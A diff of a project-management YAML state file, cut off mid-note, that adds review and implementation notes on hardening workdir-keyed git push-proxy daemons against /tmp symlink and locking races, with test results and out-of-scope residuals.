@@ -6849,7 +6849,7 @@ prs:
   gh_pr: https://github.com/mjtomei/project_manager/pull/143
   gh_pr_number: 143
   created_at: '2026-03-10T00:41:37.907137+00:00'
-  updated_at: '2026-04-07T22:44:24.695069+00:00'
+  updated_at: '2026-10-27T16:34:23.765504+00:00'
   started_at: '2026-03-14T04:37:49.204416+00:00'
   reviewed_at: '2026-04-07T22:44:24.695069+00:00'
   merged_at: null
@@ -6858,6 +6858,39 @@ prs:
     text: 'QA INPUT_REQUIRED:  (workdir: /home/mjtomei/.pm/workdirs/qa/pr-ac12b47-79d4f9af4b607a9b)'
     created_at: '2026-04-07T14:13:07Z'
     last_edited: '2026-04-07T14:13:07Z'
+  - id: note-01f101a
+    text: 'Heads-up from pr-748e708 (workdir-keyed push proxies, merged-to-be): shared
+      proxy socket dirs are now named /tmp/pm-push-proxy-{session_tag}-{pr_id}-{workdir_token}
+      (hash of the host workdir realpath), and the hashed fallback still gets a long-named
+      symlink, so a `/tmp/pm-push-proxy-{session_tag}-*` glob still matches every
+      case. Two adjustments for cleanup_stale_proxy_dirs/restart_dead_proxies: (1)
+      when stopping a shared proxy dir, call `_kill_proxy_socket(sock, remove_dir=False)`
+      — removing the dir breaks a container that still bind-mounts it (the S18 failure);
+      remove dirs only at full session teardown, where `stop_session_proxies` now
+      does it. (2) `start_push_proxy` now takes the workdir and keys on it, so restart_dead_proxies
+      must pass the workdir it already reads from the /workspace bind mount, else
+      it will create a proxy for the wrong key. Also: `_remove_proxy_dirs` refuses
+      to rmtree a path that does not resolve to a proxy dir directly under /tmp —
+      keep that guard if you re-implement sweeping. (2026-10-27)'
+    created_at: '2026-10-27T05:14:34Z'
+    last_edited: '2026-10-27T05:14:34Z'
+  - id: note-10475af
+    text: 'pr-748e708 (workdir-keyed push proxies, 2026-10-27) changed the shared-proxy
+      teardown surface this PR will call: (1) stop_push_proxy on a shared proxy now
+      REMOVES the socket + proxy.json but KEEPS the socket directory (a container
+      may still bind-mount it; deleting it was the S18 failure) — a stale-proxy sweep
+      must not rmtree that directory unless it also knows no container mounts it;
+      (2) stop_session_proxies/stop_all_proxies already do the directory removal at
+      teardown, through _stop_socket_under_lock (per-directory start lock, non-blocking)
+      and _remove_proxy_dirs (refuses non-proxy paths, foreign-uid dirs, live proxies,
+      and dirs whose start lock is held) — reuse those helpers instead of re-implementing
+      a /tmp glob sweep; (3) keys are now 3-part "{session_tag}\0{pr_id}\0{workdir_token}"
+      and shared proxies are tracked only in _proxy_refs, not _active_proxies. Cross-process
+      refcounting is still in-process only, so a stale-proxy cleanup that removes
+      a proxy another process still references is exactly the gap this PR leaves for
+      you.'
+    created_at: '2026-10-27T16:34:23Z'
+    last_edited: '2026-10-27T16:34:23Z'
   workdir: /home/mjtomei/.pm/workdirs/project-manager-828c8d0a/pm-pr-ac12b47-session-cleanup-for-stale-containers-ab512a43
 - id: pr-53e47a1
   plan: tui-ux
@@ -13460,11 +13493,23 @@ prs:
   gh_pr: null
   gh_pr_number: null
   created_at: '2026-05-02T22:38:22.256223+00:00'
-  updated_at: '2026-05-02T22:38:22.256223+00:00'
+  updated_at: '2026-10-27T05:14:51.676556+00:00'
   started_at: null
   reviewed_at: null
   merged_at: null
-  notes: []
+  notes:
+  - id: note-1f6cf82
+    text: 'Heads-up from pr-748e708 review: the code path this bug describes no longer
+      exists. `pm_core/push_proxy.py` no longer runs `git -C <target> fetch --update-head-ok
+      <source> <branch>:<branch>` (grep for `update-head-ok`/`denyCurrentBranch` returns
+      nothing on master). `_execute_push` now rejects any push whose origin resolves
+      to a local path, fail-closed, with a message telling scenario clones to rewrite
+      origin to the real upstream. So the "staged revert / desynced index" symptom
+      should be gone; the remaining risk is the explicit rejection (pr-d82e0f1 covers
+      PR workdirs whose origin fetch URL is still local). Please confirm against master
+      before implementing — this PR may be closable. (2026-10-27)'
+    created_at: '2026-10-27T05:14:51Z'
+    last_edited: '2026-10-27T05:14:51Z'
 - id: pr-6bf587b
   plan: bugs
   title: 'Bug: sync kills merge propagation window (variants 1/2) when PR detected
@@ -14527,11 +14572,965 @@ prs:
   gh_pr: null
   gh_pr_number: null
   created_at: '2026-05-04T11:58:45.935220+00:00'
-  updated_at: '2026-05-04T11:58:45.935220+00:00'
+  updated_at: '2026-10-28T03:34:01.330534+00:00'
   started_at: null
   reviewed_at: null
   merged_at: null
-  notes: []
+  notes:
+  - id: note-6245c1d
+    text: 'Impl (2026-10-27): shared push proxies are now keyed by (session_tag, pr_id,
+      workdir_token); impl/review/sign-off on the PR workdir share one proxy, each
+      QA scenario clone gets its own. start_push_proxy refuses to replace a live proxy
+      serving a different workdir/branch (metadata sidecar), takes a per-dir flock
+      around check-and-spawn, and raises PushProxyError if the daemon is not connectable
+      within 5 s. Requests naming a foreign or missing workdir are rejected explicitly;
+      no silent cross-clone push. Shared stops keep the socket directory (a container
+      may still bind-mount it); stop_session_proxies/stop_all_proxies remove dirs
+      at teardown. get_proxy_socket_path takes workdir; container.py callers pass
+      it. Evidence: /pm-captures/impl/pre-fix/repro-proxy-key and /pm-captures/impl/post-fix/verify-proxy-key.
+      Tests: tests/test_push_proxy.py TestWorkdirKeyedProxies (11 new) and the full
+      suite (3763 passed, 1 skipped; run with PATH=/usr/bin so the container git wrapper
+      does not intercept test pushes). #249 socket disappearance: cause NOT established;
+      this change adds readiness/recovery and never deletes a shared socket dir, but
+      does not claim the workdir collision caused it. Container ownership/cleanup
+      stays with pr-1139060 (#241); no duplication here.'
+    created_at: '2026-10-27T04:54:58Z'
+    last_edited: '2026-10-27T05:04:04Z'
+  - id: note-0185a95
+    text: 'Review-loop 7d11 i1 (2026-10-27): reviewed 3de978b5. Design is sound and
+      matches the spec (workdir-keyed key/dir, metadata refusal, per-dir flock, readiness
+      raise, dir retention, foreign/missing-workdir rejection); captures are convincing
+      — pre-fix shows impl+QA on one socket with the impl push force-updating to the
+      QA commit and the dir being removed, post-fix shows distinct sockets and the
+      impl dir surviving QA cleanup. I also confirmed test_impl_and_qa_get_distinct_proxies
+      fails on 74462d76 for the right reason (assert 1 == 3, all three containers
+      on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock). Four fixes applied on top: (1)
+      PushProxy.stop() now checks the socket inode before unlinking (_owns_socket_path)
+      — R3 required "stop() must not unlink a socket it does not own" and only the
+      start()-returned-False case was guarded, so a daemon whose path was rebound
+      would delete the replacement socket + metadata; (2) _remove_proxy_dirs no longer
+      rmtree"s a path that resolves outside a /tmp/pm-push-proxy-* dir (_is_proxy_dir)
+      — /tmp is world-writable, so a planted /tmp/pm-push-proxy-<tag>-* symlink would
+      have made session teardown delete an arbitrary directory; the link is still
+      unlinked, its target is not; (3) a non-string "workdir" in a request is rejected
+      explicitly instead of raising TypeError and dropping the connection with no
+      response; (4) corrected the stale create_container comment claiming the proxy
+      handles local-path origins (it has been fail-closed since before this PR). Tests:
+      added the inode-ownership, foreign-symlink and non-string-workdir cases plus
+      an autouse fixture that sweeps the /tmp dirs/locks the tests now leave behind
+      (shared stops keep dirs by design) — 66 push-proxy tests pass. Full suite: 3695
+      passed, 55 failed, 17 errors; every failure is a pre-existing environment failure
+      (test_merge_publish, test_signoff_integration, test_markdown_render missing
+      markdown module, test_git_ops pull-rebase, test_hook_events) and reproduces
+      identically at 3de978b5 without these edits. Residual, explicitly out of scope
+      per spec R8: refcounts are in-process only, so a same-workdir container owned
+      by another process can still lose its daemon when this process drops its last
+      ref (now recoverable — the dir survives and create_container/reuse or restart_dead_proxies
+      respawns). Left notes on pr-ac12b47 (socket-dir naming, remove_dir=False, pass
+      workdir to start_push_proxy) and pr-e43e4b0 (the fetch --update-head-ok path
+      it targets no longer exists). (2026-10-27)'
+    created_at: '2026-10-27T05:20:32Z'
+    last_edited: '2026-10-27T05:20:32Z'
+  - id: note-6235bfb
+    text: 'Review-loop 7d11 i2 (2026-10-27): reviewed afeaa283. Fixes applied: (1)
+      the daemon *process* now exits when its socket path is rebound — the spec edge
+      case "daemon orphaned after its socket path is replaced → inode check makes
+      it exit" was only half-true: _serve_loop noticed the rebind but the __main__
+      wait loop still tested os.path.exists(_sock), so a daemon whose path was unlinked
+      and rebound inside one 2 s tick lived forever holding no socket. Reproduced
+      at afeaa283 (old daemon still alive 8 s after a new one rebound its path; note
+      os.kill(pid,0) reports a reaped child as alive — use Popen.poll) and verified
+      fixed; the wait loop is now _wait_for_socket_exit(), sharing PushProxy.socket_is_current()
+      with the serve loop. (2) socket_is_current() restores an existence check when
+      _sock_ino is None (stat failed at bind time) — the i1 inode refactor had dropped
+      the old os.path.exists check for that case, so such a daemon never exited on
+      socket removal. (3) _remove_proxy_dirs() also refuses to rmtree a directory
+      whose st_uid is not ours, completing i1 symlink-target guard (_is_proxy_dir)
+      for world-writable /tmp; a missing dir still gets its stale .lock cleared. Tests:
+      4 new (socket_is_current removal/rebind, no-inode fallback, _wait_for_socket_exit
+      exits, uid guard) — 70 push-proxy tests pass. Full suite (PATH=/usr/bin:/bin,
+      PYTHONPATH=/workspace): 3758 passed, 1 skipped, 13 failed — all environment:
+      12 test_markdown_render (no markdown module) + test_hook_events::test_installer_writes_standalone_receiver,
+      both pre-existing. Re-verified the bug-fix evidence: post-fix verify script
+      passes on HEAD, and test_impl_and_qa_get_distinct_proxies fails at 74462d76
+      with assert 1 == 3 (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock).
+      Spec updated with a "Review iteration 2 refinements" section.'
+    created_at: '2026-10-27T05:42:38Z'
+    last_edited: '2026-10-27T05:42:38Z'
+  - id: note-4c92538
+    text: 'Review-loop b067 i1 (2026-10-27): reviewed 6a8aadcf. Re-verified the fix
+      at HEAD with real subprocess daemons (distinct socket per workdir, foreign-workdir
+      request rejected with an explicit message, shared stop keeps the socket dir,
+      restart heals in place, session sweep removes the dirs) and the full suite (3761
+      passed, 1 skipped, 13 known environment failures: 12 test_markdown_render +
+      test_hook_events). Three lifecycle guards added: (1) _remove_proxy_dirs now
+      takes the per-directory start lock (non-blocking) and re-checks proxy_is_alive
+      before rmtree, so a session sweep racing a container start can no longer delete
+      the socket dir a container bind-mounts (the S18 failure through another door);
+      (2) _clear_lock_file probes with LOCK_NB before unlinking a start-lock file,
+      and _kill_proxy_socket(lock_held=True) is used by stop_session_proxies'' kill
+      loop, which now also skips a directory whose start is in flight — teardown can
+      no longer break the R7 serialisation or kill a proxy that is being created;
+      (3) added the missing R7 test (3 concurrent starts -> exactly one spawn; 3 spawns
+      when _start_lock is stubbed out) plus sweep-guard tests. 73 push-proxy tests
+      pass. Residual, unchanged and out of scope: in-process refcounts only (cross-process
+      cleanup stays with pr-ac12b47/#241).'
+    created_at: '2026-10-27T06:19:47Z'
+    last_edited: '2026-10-27T06:19:47Z'
+  - id: note-cdc3517
+    text: 'Review-loop db89 i1 (2026-10-27): reviewed c356eb4d (unchanged since b067
+      i1). Design and evidence re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key
+      passes (distinct socket per workdir, impl push lands its own commit, QA stop
+      leaves the impl socket dir intact), and test_impl_and_qa_get_distinct_proxies
+      fails at 74462d76 for the right reason (assert 1 == 3, all three containers
+      on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock). Five fixes applied, each with
+      a test that fails on c356eb4d and passes at HEAD: (1) start_push_proxy''s spawn
+      path did `_proxy_refs[key] = {container_name}`, replacing the set — if two containers
+      shared a workdir and the socket died, the first to restart dropped the sibling''s
+      ref, so stopping it later killed the proxy the sibling still used. Both paths
+      now use _add_proxy_ref(), which adds to the set and drops a container''s ref
+      under an old key when it re-registers against a different workdir. (2) R4''s
+      type check ran after `request.get("workdir") or None`, so falsy non-strings
+      ([], 0, false) were treated as "field absent" and silently fell back to self.workdir;
+      the check now runs on the raw value (only "" still means absent). (3) _kill_proxy_socket
+      had none of the teardown guards _remove_proxy_dirs got in i1/i2, yet stop_all_proxies/stop_session_proxies
+      reach it through a /tmp glob: a planted /tmp/pm-push-proxy-… symlink could make
+      it unlink push.sock/proxy.json inside an arbitrary directory, and another user''s
+      proxy-shaped dir would raise EPERM and abort the whole sweep. It now requires
+      a proxy dir directly under the glob''s parent and skips foreign-owned dirs (link
+      still unlinked, target untouched). (4) wrap_claude_cmd wrapped PushProxyError
+      into ContainerError("… Is docker running?"), hiding R5''s real reason; it now
+      reports "push proxy unavailable — <why>". (5) Incidental: _kill_proxy_socket
+      only caught FileNotFoundError on the socket unlink, but docker creates a directory
+      at a bind-mounted socket path (older pm mounted the file itself); IsADirectoryError
+      would abort stop_push_proxy/stop_session_proxies/stop_all_proxies — it now removes
+      it. Tests: tests/test_push_proxy.py 81 passed, tests/test_container.py passed;
+      full suite 3770 passed, 1 skipped, 13 failed (all pre-existing environment:
+      12 test_markdown_render missing markdown module + test_hook_events::test_installer_writes_standalone_receiver),
+      run with PATH=/usr/bin:/bin, PYTHONPATH=/workspace. Residual, out of scope:
+      in-process refcounts only (cross-process cleanup stays with #241/pr-ac12b47);
+      one daemon per workdir means a QA loop with N scenarios runs N proxy processes
+      (acceptable now; option (3), workdir-per-request, remains the cleaner long-term
+      design). (2026-10-27)'
+    created_at: '2026-10-27T06:50:45Z'
+    last_edited: '2026-10-27T06:50:45Z'
+  - id: note-6977072
+    text: 'Review-loop db89 i2 (2026-10-27): reviewed 6941c923 (unchanged since db89
+      i1). Re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key passes
+      (distinct socket per workdir, impl push lands its own commit, QA stop leaves
+      the impl socket dir intact), and test_impl_and_qa_get_distinct_proxies fails
+      at 74462d76 (assert 1 == 3). Seven fixes applied, each with a test: (1) PushProxy.stop()
+      no longer unlinks a socket it never bound - start() sets _server_socket before
+      bind(), so a bind() failure left _sock_ino unset and _owns_socket_path() returned
+      True on the no-inode fallback, deleting another daemon socket; the instance
+      now records _bound after a successful bind (reproduced at 6941c923: the file
+      is gone after stop()). (2) stop_push_proxy shared path now goes through _stop_shared_proxy_socket(),
+      which takes the per-directory start lock (non-blocking) and re-checks _proxy_refs
+      before unlinking - a concurrent start that reused the socket between the last
+      ref being dropped and the kill could otherwise have it unlinked from under it
+      (S18 through the per-container path). Lock order unchanged (_start_lock then
+      _proxy_lock). (3) The legacy per-container stop gets the same guard and passes
+      lock_held=True; without it the _clear_lock_file LOCK_NB probe saw our own lock
+      and leaked a .lock on every legacy stop. (4) stop_session_proxies also derives
+      candidate sockets from the in-process registry, so a hashed socket dir whose
+      long-name symlink is missing (the {tag}-* glob cannot match the hash) no longer
+      survives teardown; it failed at 6941c923 with count 0. (5) A non-object JSON
+      request (e.g. ["origin"]) used to raise AttributeError and be dropped with no
+      response; now rejected explicitly. (6) Socket-file removal consolidated into
+      _unlink_socket_file() at all five unlink sites (module-level import shutil),
+      so the IsADirectoryError branch cannot be lost at a future call site. Tests:
+      tests/test_push_proxy.py 88 passed, tests/test_container.py passed (189 together).
+      Full suite: 3777 passed, 1 skipped, 13 failed - all pre-existing environment
+      (12 test_markdown_render missing markdown module + test_hook_events::test_installer_writes_standalone_receiver).
+      Residual, unchanged and out of scope: in-process refcounts only (cross-process
+      cleanup stays with #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request,
+      remains the cleaner long-term design); stop_all_proxies (no non-test callers)
+      still sweeps without the start-lock guard - if it gains a caller it should use
+      the same guard. (2026-10-27T07:19:37Z)'
+    created_at: '2026-10-27T07:19:45Z'
+    last_edited: '2026-10-27T07:19:45Z'
+  - id: note-533ff24
+    text: 'Review-loop db89 i3 (2026-10-27): reviewed 848ab98c (unchanged since db89
+      i2). Re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key passes
+      (distinct socket per workdir, impl push lands its own commit, QA stop leaves
+      the impl socket dir intact); test_impl_and_qa_get_distinct_proxies fails at
+      74462d76 (2-part key -> all three containers on one socket). Four fixes applied,
+      each with a test that fails at 848ab98c for the right reason: (1) start_push_proxy
+      legacy path registered _container_to_proxy_key after releasing _start_lock,
+      so a concurrent stop_push_proxy could pass its re-check and unlink the socket
+      the restart had just spawned (the shared path registers under the lock); it
+      now registers under the lock via a new _drop_old_ref() shared with _add_proxy_ref().
+      (2) flock locks the inode, not the name: a lock file unlinked between open()
+      and flock() left the holder with an invisible lock, letting a third process
+      create a fresh file and enter check-and-spawn concurrently; _start_lock now
+      verifies with _fd_is_path_file() that the locked file is still the one at the
+      lock path and retries (bounded; blocking raises PushProxyError), and _clear_lock_file
+      refuses to unlink a replacement. (3) _shared_sock_dir discovery symlink is best-effort
+      again: an OSError (name too long) no longer fails proxy start; teardown finds
+      hashed dirs via the registry. (4) Docstring: PushProxy is no longer "single-client
+      for one container". Tests: tests/test_push_proxy.py 92 passed, tests/test_container.py
+      101 passed; full suite 3781 passed, 1 skipped, 13 failed (all pre-existing environment:
+      12 test_markdown_render missing markdown module + test_hook_events::test_installer_writes_standalone_receiver),
+      run with PATH=/usr/bin:/bin, PYTHONPATH=/workspace. Incidental (pre-existing,
+      out of the spec scope "dangerous-flag rejection unchanged"): filed pr-a9803aa
+      - git push --repo=<local path> bypasses the local-path-origin rejection because
+      _extract_remote_name only inspects the first positional remote. Residual, unchanged
+      and out of scope: in-process refcounts only (cross-process cleanup stays with
+      #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request, remains
+      the cleaner long-term design); stop_all_proxies (no non-test callers) still
+      sweeps without the start-lock guard.'
+    created_at: '2026-10-27T07:49:36Z'
+    last_edited: '2026-10-27T07:49:36Z'
+  - id: note-68f453f
+    text: 'Review-loop db89 i4 (2026-10-27): reviewed 23b21cc0 (unchanged since db89
+      i3). Re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key passes
+      (distinct socket per workdir, impl push lands its own commit, QA stop leaves
+      the impl socket dir intact); test_impl_and_qa_get_distinct_proxies fails at
+      74462d76 for the right reason (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock,
+      assert 1 == 3). Five fixes applied, each with a test that fails at 23b21cc0
+      and passes at HEAD: (1) _remove_proxy_dirs compared the resolved entry path
+      against the literal glob parent; where /tmp is a symlink (macOS /tmp -> /private/tmp)
+      every legitimate proxy dir was refused and teardown leaked them — the parent
+      is now realpath-ed (reproduced: dir survives the sweep). (2) _start_lock let
+      os.open()/fcntl.flock() raise PermissionError for a lock file another user planted
+      in world-writable /tmp: a teardown sweep aborted, and a start surfaced through
+      wrap_claude_cmd as "Is docker running?" — non-blocking now treats it like busy
+      (yields False), blocking raises PushProxyError (reproduced: PermissionError
+      escapes both modes). (3) _shared_sock_dir rmtree-d a real directory squatting
+      on the long discovery name without checking ownership; it now requires st_uid
+      == ours, matching the sweep/kill guards from i1-i2. (4) listen(1) -> listen(16):
+      the daemon serves one request at a time (a push can run 120 s) and proxy_is_alive
+      probes connect without sending, so one queued probe made the next connect time
+      out and a live-but-busy proxy was replaced — the failure R3 exists to prevent.
+      (5) build_exec_cmd EXIT trap (legacy per-container proxies) removed push.sock
+      then rmdir-d the dir, but the new proxy.json sidecar kept it non-empty so the
+      rmdir failed and the dir leaked; the trap now removes the sidecar first. Tests:
+      tests/test_push_proxy.py 95 passed, tests/test_container.py 101 passed (196
+      together); full suite 3784 passed, 1 skipped, 13 failed (all pre-existing environment:
+      12 test_markdown_render missing markdown module + test_hook_events::test_installer_writes_standalone_receiver),
+      run with PATH=/usr/bin:/bin, PYTHONPATH=/workspace. Residual, unchanged and
+      out of scope: in-process refcounts only (cross-process cleanup stays with #241/pr-ac12b47);
+      one daemon per workdir (option (3), workdir-per-request, remains the cleaner
+      long-term design); stop_all_proxies (no non-test callers) still sweeps without
+      the start-lock guard; proxy_is_alive still cannot distinguish a busy daemon
+      from a dead one beyond the larger backlog. Also noted on pr-a9803aa: the local-path-origin
+      rejection is bypassed by a positional local path/file:// URL, not only --repo
+      (pre-existing).'
+    created_at: '2026-10-27T08:15:36Z'
+    last_edited: '2026-10-27T08:15:36Z'
+  - id: note-b4a3eac
+    text: 'Review-loop db89 i5 (2026-10-27): reviewed ece0e02c (unchanged since db89
+      i4). Re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key passes
+      (distinct socket per workdir, impl push lands its own commit, QA stop leaves
+      the impl socket dir intact); test_impl_and_qa_get_distinct_proxies still fails
+      at 74462d76 (2-part key -> all three containers on one socket). Three fixes
+      applied, each with a test that fails at ece0e02c for the right reason: (1) a
+      regular file squatting on the socket-directory name in world-writable /tmp made
+      os.makedirs raise a bare FileExistsError out of start_push_proxy, which wrap_claude_cmd
+      reported as "Is docker running?"; _start_lock now converts it like the unusable-lock-file
+      case (blocking -> PushProxyError naming the directory, non-blocking -> yields
+      False so teardown skips), the legacy per-container path raises PushProxyError
+      directly, and _shared_sock_dir treats its own makedirs as best-effort. (2) The
+      spec edge case "Hash collision -> metadata check (R3) refuses the mismatch"
+      was only half-implemented: R3 ran on the reuse path, so a dead socket whose
+      proxy.json recorded a different workdir (only possible via a token collision)
+      was silently replaced by a daemon for the requested clone; the spawn path now
+      reads the stale sidecar and raises PushProxyConflict naming both paths. (3)
+      _start_proxy_subprocess let subprocess.Popen raise a bare OSError (e.g. missing
+      interpreter), escaping start_push_proxy and again surfacing as "Is docker running?";
+      it now logs and returns False so R5''s PushProxyError names the socket and workdir,
+      matching its documented contract. Tests: test_unusable_socket_dir_is_skipped_by_teardown,
+      test_start_reports_a_squatted_socket_dir_as_proxy_error, test_legacy_start_reports_a_squatted_dir_as_proxy_error,
+      test_dead_socket_with_foreign_metadata_is_refused, test_spawn_failure_is_reported_as_a_proxy_error;
+      tests/test_push_proxy.py + tests/test_container.py 201 passed (run with PATH=/usr/bin:/bin
+      so the container git wrapper does not intercept test pushes). Residual, unchanged
+      and out of scope: in-process refcounts only (cross-process cleanup stays with
+      #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request, remains
+      the cleaner long-term design); stop_all_proxies (no non-test callers) still
+      sweeps without the start-lock guard; proxy_is_alive still cannot distinguish
+      a busy daemon from a dead one beyond the larger backlog. (2026-10-27)'
+    created_at: '2026-10-27T08:33:35Z'
+    last_edited: '2026-10-27T08:33:35Z'
+  - id: note-98537c1
+    text: 'Review-loop db89 i6 (2026-10-27): reviewed ff17b1b8. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact);
+      test_impl_and_qa_get_distinct_proxies still fails at 74462d76 (2-part key ->
+      all three containers on one socket). Two start-path gaps fixed, each with a
+      test that fails at ff17b1b8 for the right reason: (1) a symlink planted at the
+      shared socket-directory name was followed, so start_push_proxy deleted <target>/push.sock
+      and the daemon would write proxy.json and bind inside whatever directory the
+      link pointed at (reproduced: the target push.sock is gone after a start); (2)
+      a directory we cannot write (or one owned by another user) made _unlink_socket_file
+      raise a bare PermissionError out of start_push_proxy, which wrap_claude_cmd
+      reported as "Is docker running?" - the same misdiagnosis i5 removed for the
+      squatted-file case (reproduced: PermissionError escapes). _start_lock now calls
+      the new _sock_dir_start_problem() before touching the dir and raises PushProxyError
+      naming the reason (is a symlink / is owned by another user / is not writable).
+      The check applies to starts only (blocking=True): teardown deliberately passes
+      the long discovery symlink to _start_lock, and refusing it there would leave
+      a live proxy and its dir surviving stop_session_proxies after a restart, when
+      the registry is empty; teardown keeps its own guards (_kill_proxy_socket, _remove_proxy_dirs).
+      test_teardown_lock_still_accepts_a_symlinked_dir pins that asymmetry. Tests:
+      test_start_refuses_a_symlinked_socket_dir, test_legacy_start_refuses_a_symlinked_socket_dir,
+      test_start_reports_an_unwritable_socket_dir_as_proxy_error. tests/test_push_proxy.py
+      104 passed, tests/test_container.py 101 passed (PATH=/usr/bin:/bin so the container
+      git wrapper does not intercept test pushes). Residual, unchanged and out of
+      scope: in-process refcounts only (cross-process cleanup stays with #241/pr-ac12b47);
+      one daemon per workdir (option (3), workdir-per-request, remains the cleaner
+      long-term design); stop_all_proxies (no non-test callers) still sweeps without
+      the start-lock guard; proxy_is_alive still cannot distinguish a busy daemon
+      from a dead one beyond the backlog of 16.'
+    created_at: '2026-10-27T08:58:07Z'
+    last_edited: '2026-10-27T08:58:07Z'
+  - id: note-f2ae091
+    text: 'Review-loop db89 i7 (2026-10-27): reviewed fc5832d7 (unchanged since db89
+      i6). Re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key passes
+      (distinct socket per workdir, impl push lands its own commit, QA stop leaves
+      the impl socket dir intact); test_impl_and_qa_get_distinct_proxies fails at
+      74462d76 (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock).
+      Four fixes applied, each with a test that fails at fc5832d7 for the right reason:
+      (1) _start_lock opens the start-lock file with O_NOFOLLOW — a symlink planted
+      at the world-writable /tmp lock name made our process flock (and possibly create)
+      a file at an arbitrary host path; teardown now treats it like any unusable lock
+      file (skips the dir), a start raises PushProxyError, and _clear_lock_file removes
+      the link itself (never the target). (2) _write_metadata uses tempfile.mkstemp
+      (O_CREAT|O_EXCL, random name) instead of a predictable <proxy.json>.<pid>.tmp
+      name: the socket dir is bind-mounted writable into the container, so a planted
+      symlink there made the daemon write the sidecar through it and then os.replace
+      the link onto proxy.json. (3) _read_metadata opens with O_RDONLY|O_NOFOLLOW|O_NONBLOCK
+      and only accepts a regular file of bounded size (_METADATA_MAX_BYTES) — a planted
+      link, FIFO (blocks a start under the lock) or huge file is refused. (4) stop_all_proxies
+      now uses the guarded kill through the new _stop_socket_under_lock(), shared
+      with stop_session_proxies — the residual noted since i3. Also removed the legacy
+      start''s duplicated makedirs (_start_lock already reports it as PushProxyError)
+      and hoisted sys/tempfile imports to module level. Tests: tests/test_push_proxy.py
+      + tests/test_container.py 211 passed (log /pm-captures/review-db89-i7/); full
+      suite 3799 passed, 1 skipped, 13 failed (all pre-existing environment: 12 test_markdown_render
+      without the markdown module + test_hook_events::test_installer_writes_standalone_receiver),
+      log /pm-captures/review-db89-i7/full-suite.log. Two new tests/test_container.py
+      reuse-path tests pin R8''s get_proxy_socket_path(..., workdir=...) lookup and
+      the workdir a proxy restart uses. Spec updated with a Review iteration 10 refinements
+      section. Residual, unchanged and out of scope: in-process refcounts only (cross-process
+      cleanup stays with #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request,
+      remains the cleaner long-term design); proxy_is_alive still cannot distinguish
+      a busy daemon from a dead one beyond the backlog of 16.'
+    created_at: '2026-10-27T09:35:31Z'
+    last_edited: '2026-10-27T09:35:31Z'
+  - id: note-70ff0fd
+    text: 'Review-loop db89 i8 (2026-10-27): reviewed 9648f07b (unchanged since db89
+      i7). Re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key passes
+      (distinct socket per workdir, impl push lands its own commit, QA stop leaves
+      the impl socket dir intact); test_impl_and_qa_get_distinct_proxies fails at
+      74462d76 with assert 1 == 3 (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock).
+      No behavioural defect found this pass; three documentation/test-accuracy fixes
+      applied: (1) the registry comment read as if _active_proxies held both keying
+      schemes, but shared proxies are tracked only in _proxy_refs (which is why stop_session_proxies
+      unions the two) - a future cleanup reading _active_proxies alone would miss
+      every shared proxy, so the invariant is now stated; (2) TestSharedProxy docstring
+      said the 2-part key; (3) test_stop_session_removes_kept_socket_dirs now also
+      pins that session teardown clears the .lock file a shared stop deliberately
+      leaves beside the kept directory. Incidental: dropped an unused _CONTAINER_SOCKET_PATH
+      import from create_container (pyflakes). Full suite (PATH=/usr/bin:/bin, PYTHONPATH=/workspace):
+      3811 passed, 1 skipped, 1 failed - test_hook_events::test_installer_writes_standalone_receiver,
+      confirmed pre-existing at 74462d76 and unrelated (a standalone hook receiver
+      is not installed under a tmp HOME). Logs: /pm-captures/review-db89-i8/. Spec
+      updated with a Review iteration 11 refinements section. Residual, unchanged
+      and out of scope: in-process refcounts only (cross-process cleanup stays with
+      #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request, remains
+      the cleaner long-term design); proxy_is_alive still cannot distinguish a busy
+      daemon from a dead one beyond the backlog of 16; the daemon serves one request
+      at a time, so a long push serialises other requests on the same workdir; a shared
+      stop leaves its .lock beside the kept directory until session teardown. (2026-10-27)'
+    created_at: '2026-10-27T10:42:37Z'
+    last_edited: '2026-10-27T10:42:37Z'
+  - id: note-6c70773
+    text: 'Review-loop 6280 i1 (2026-10-27): reviewed f74c4e70. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact),
+      and test_impl_and_qa_get_distinct_proxies fails at 74462d76 with assert 1 ==
+      3 (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock). Two
+      defects in the new teardown code fixed, each with a test that fails at f74c4e70
+      for the right reason: (1) _remove_proxy_dirs unlinked a matching discovery symlink
+      before deciding what to do with its target, so a sweep that left a directory
+      in place (a start in flight, or a live proxy) also destroyed the long-name link
+      — the only way a later process with an empty registry finds a hashed directory
+      to sweep, i.e. the iteration-5 leak through the sweep; the link is now unlinked
+      only when the target is removed, is not a proxy dir, or is not a dir. (2) PushProxy.stop()
+      unlinked the proxy.json sidecar with only FileNotFoundError handled, but the
+      socket dir is bind-mounted writable into the container, so a container can create
+      a *directory* named proxy.json — IsADirectoryError escaped stop() on the daemon
+      exit path (and in the in-process teardown); it now ignores OSError, matching
+      _kill_proxy_socket. Test gap closed: R1 realpath edge case (a symlinked/trailing-slash
+      spelling of one workdir shares one proxy) had no test; added test_same_workdir_via_a_symlink_shares_one_proxy,
+      which also pins R4 realpath comparison. Tests: tests/test_push_proxy.py + tests/test_container.py
+      214 passed; full suite 3814 passed, 1 skipped, 1 failed (pre-existing environment:
+      test_hook_events::test_installer_writes_standalone_receiver), run with PATH=/usr/bin:/bin,
